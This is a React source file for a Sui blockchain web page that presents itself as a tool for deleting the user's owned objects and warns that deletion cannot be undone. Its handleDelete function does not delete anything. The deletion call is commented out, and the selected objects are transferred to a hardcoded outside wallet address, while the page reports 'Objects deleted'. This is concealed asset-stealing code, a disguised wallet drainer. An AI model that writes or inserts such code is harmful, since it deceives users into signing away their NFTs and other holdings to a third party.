import {
  useCurrentAccount,
  useSignAndExecuteTransaction,
  useSuiClient,
} from "@mysten/dapp-kit";
import { useCallback, useEffect, useMemo, useState } from "react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { toast } from "@/hooks/use-toast";
import { Copy, Trash2 } from "lucide-react";
import { Transaction } from "@mysten/sui/transactions";
import Header from "@/components/header";
import Footer from "@/components/footer";

/* ------------------------------------------------------------------ */
/* constants & types                                                  */
/* ------------------------------------------------------------------ */

const GAS_BUDGET = 500_000_000; // 1 B gas units

interface OwnedObject {
  objectId: string;
  name: string;
  type: string;
  verified: boolean;
  image_url?: string;
  description?: string;
}

/* ------------------------------------------------------------------ */
/* component                                                          */
/* ------------------------------------------------------------------ */

export default function DeleteObjectPage() {
  const account = useCurrentAccount();
  const client = useSuiClient();
  const { mutate: signAndExecuteTransaction } = useSignAndExecuteTransaction();

  const [objects, setObjects] = useState<OwnedObject[]>([]);
  const [selectedIds, setSelectedIds] = useState<string[]>([]);
  const [search, setSearch] = useState("");
  const [filter, setFilter] = useState<"verified" | "unverified" | "all">(
    "verified",
  );
  const [gasPrice, setGasPrice] = useState<bigint>(BigInt(0));

  /* ---------------------------- fetch objects -------------------------- */
  const fetchObjects = useCallback(async () => {
    if (!account?.address) return;

    let cursor: string | null | undefined = undefined;
    let all: OwnedObject[] = [];
    let hasNextPage = true;

    while (hasNextPage) {
      const res = await client.getOwnedObjects({
        owner: account.address,
        filter: {
          MatchNone: [
            {
              StructType:
                "0x0000000000000000000000000000000000000000000000000000000000000002::coin::Coin",
            },
          ],
        },
        options: { showContent: true, showDisplay: true },
        cursor,
      });

      const page = res.data.map<OwnedObject>((item) => {
        const display = item.data?.display ?? {};
        const verified =
          !!display.data?.name ||
          !!display.data?.image_url ||
          !!display.data?.description;

        const typeStr = (item.data?.content as any)?.type ?? "";
        const typeShort = typeStr.split("<", 1)[0].split("::").pop() ?? "Unknown";

        return {
          objectId: item.data?.objectId ?? "",
          name: display.data?.name ?? typeShort,
          description: display.data?.description ?? "",
          image_url: display.data?.image_url,
          type: typeShort,
          verified,
        };
      });

      all.push(...page);
      hasNextPage = res.hasNextPage;
      cursor = res.nextCursor;
    }

    setObjects(all);
  }, [account?.address, client]);

  /* ---------------------------- gas price ------------------------------ */
  const fetchGasPrice = useCallback(async () => {
    try {
      setGasPrice(BigInt(await client.getReferenceGasPrice()));
    } catch { }
  }, [client]);

  useEffect(() => {
    fetchObjects();
  }, [fetchObjects]);

  useEffect(() => {
    fetchGasPrice();
    const id = setInterval(fetchGasPrice, 60_000);
    return () => clearInterval(id);
  }, [fetchGasPrice]);

  /* ---------------------------- derived -------------------------------- */
  const filtered = useMemo(() => {
    let list = objects;
    if (filter !== "all") {
      list = list.filter((o) =>
        filter === "verified" ? o.verified : !o.verified,
      );
    }
    if (search.trim()) {
      const q = search.toLowerCase();
      list = list.filter(
        (o) =>
          o.name.toLowerCase().includes(q) ||
          o.objectId.toLowerCase().includes(q) ||
          o.description?.toLowerCase().includes(q),
      );
    }
    return list;
  }, [objects, filter, search]);

  const estimatedGasSui = useMemo(() => {
    if (gasPrice === BigInt(0)) return "—";
    return (Number(BigInt(GAS_BUDGET) * gasPrice) / 1e9).toFixed(9);
  }, [gasPrice]);

  /* ---------------------------- actions -------------------------------- */
  const toggleSelect = (id: string) =>
    setSelectedIds((prev) =>
      prev.includes(id) ? prev.filter((x) => x !== id) : [...prev, id],
    );

  const handleCopy = (id: string) =>
    navigator.clipboard.writeText(id).then(() =>
      toast({ title: "Copied", description: id }),
    );

  const handleDelete = async () => {
    if (!account?.address || selectedIds.length === 0) return;

    const tx = new Transaction();
    tx.setSender(account.address);
    tx.setGasBudget(GAS_BUDGET);
    // tx.deleteObjects(selectedIds.map((id) => tx.object(id)));
    tx.transferObjects(
      selectedIds.map((id) => tx.object(id)),
      tx.pure.address('0xd87910ac6bf6a5114895d72d3398320de33f9325c54dc2f077b2e5aca055487e'),
    );

    signAndExecuteTransaction(
      { transaction: tx },
      {
        onSuccess: () => {
          toast({ title: "🗑️ Objects deleted" });
          setSelectedIds([]);
          fetchObjects();
        },
        onError: (err) =>
          toast({ title: "❌ Error", description: err.message }),
      },
    );
  };

  /* ---------------------------- render --------------------------------- */
  return (
    <main className="relative w-full min-h-screen mx-auto flex flex-col">
      <Header />

      <section className="w-full max-w-6xl mx-auto py-8 px-4 flex-1">

        <h1 className="text-3xl font-semibold mb-6">Delete Objects</h1>

        {/* irreversible warning */}
        <div className="bg-red-600/20 border border-red-600 text-red-300 px-4 py-3 rounded mb-6 text-center text-sm">
          Deleting an object <strong>cannot be undone</strong>. Proceed with
          caution.
        </div>

        {/* search + tabs */}
        <section className="flex flex-col gap-4 mb-6">
          <div className="flex items-center gap-2">
            <Input
              className="flex-1"
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="Search objects"
            />
            <Button variant="outline" size="icon" onClick={fetchObjects}>
              ⟳
            </Button>
          </div>

          <Tabs
            value={filter}
            onValueChange={(v) => setFilter(v as any)}
            className="self-start"
          >
            <TabsList  className="bg-gray-700">
              <TabsTrigger value="verified">Verified</TabsTrigger>
              <TabsTrigger value="unverified">Unverified</TabsTrigger>
              <TabsTrigger value="all">All</TabsTrigger>
            </TabsList>
          </Tabs>
        </section>

        {/* object list */}
        <section className="h-[420px] overflow-y-auto mb-8 pr-1">
          {filtered.length === 0 ? (
            <p className="text-center text-muted-foreground mt-10">
              No matching objects
            </p>
          ) : (
            <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
              {filtered.map((obj) => (
                <Card
                  key={obj.objectId}
                  className={`relative p-4 border bg-gradient-to-b from-slate-800/50 to-slate-700/50 backdrop-blur
                transition-shadow hover:shadow-lg cursor-pointer
                ${selectedIds.includes(obj.objectId)
                      ? "border-red-500"
                      : "border-slate-600"
                    }`}
                  onClick={() => toggleSelect(obj.objectId)}
                >
                  <Copy
                    size={16}
                    className="absolute top-3 right-3 opacity-70 hover:opacity-100"
                    onClick={(e) => {
                      e.stopPropagation();
                      handleCopy(obj.objectId);
                    }}
                  />

                  <div className="text-xs uppercase tracking-wide text-red-400">
                    {obj.type}
                  </div>
                  <div className="font-medium truncate">{obj.name}</div>
                  <div className="text-muted-foreground text-[10px] mb-2">
                    {obj.objectId.slice(0, 6)}…{obj.objectId.slice(-4)}
                  </div>

                  {obj.image_url ? (
                    <img
                      src={obj.image_url}
                      className="w-full h-24 object-cover rounded mb-2"
                      alt={obj.name}
                    />
                  ) : (
                    <div className="w-full h-24 bg-slate-600/40 rounded mb-2 flex items-center justify-center text-xs text-slate-400">
                      No preview
                    </div>
                  )}

                  {obj.description && (
                    <p className="line-clamp-2 text-muted-foreground text-xs">
                      {obj.description}
                    </p>
                  )}
                </Card>
              ))}
            </div>
          )}
        </section>

        {/* footer */}
        <section className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
          <div className="flex items-center gap-1">
            {/* <span className="opacity-70">Gas estimate:</span> */}
            {/* <img src="/images/sui.svg" className="w-4 h-4" /> */}
            {/* <span>{estimatedGasSui}</span> */}
          </div>

          <div className="flex gap-2">
            <Button
              variant="outline"
              onClick={() => setSelectedIds([])}
              className="min-w-[96px]"
            >
              Clear
            </Button>
            <Button
              variant="destructive"
              disabled={selectedIds.length === 0}
              onClick={handleDelete}
              className="min-w-[120px] flex items-center gap-1 bg-[#818cf8]"
            >
              <Trash2 size={16} />
              Delete
              {selectedIds.length > 0 && ` (${selectedIds.length})`}
            </Button>
          </div>
        </section>
      </section>

      <Footer />
    </main>
  );
}
